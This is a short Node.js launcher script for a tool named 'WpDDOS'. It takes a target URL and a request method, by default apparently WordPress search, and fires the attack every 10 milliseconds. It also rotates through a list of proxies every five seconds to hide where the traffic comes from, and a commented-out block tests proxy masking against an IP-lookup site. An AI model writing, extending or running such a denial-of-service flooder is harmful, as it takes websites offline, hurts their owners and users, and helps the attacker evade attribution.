'use strict'
const WpDDOS = require('./WpDDOS');
const ProxyChanger = require('./ProxyChanger');
const config = require('./config');
const rp = require('request-promise');



(() => {

    let url = process.argv[2];
    let method = process.argv[3] || 'getWpSearch';

    let pc = new ProxyChanger('./proxylist.txt', 5000); //change after 5 sec
    pc.run();

    let wp = new WpDDOS(url, method);
    let task = function () {
        wp.runAll();
    };
    setInterval(task,10);

})();



/*process.env.HTTP_PROXY = 'http://111.7.162.65:8080';

rp('http://ipinfo.info/index.php')
    .then((html) =>{
       console.log(html);
    })
    .catch((err)=>{
       console.log(err);
    });
*/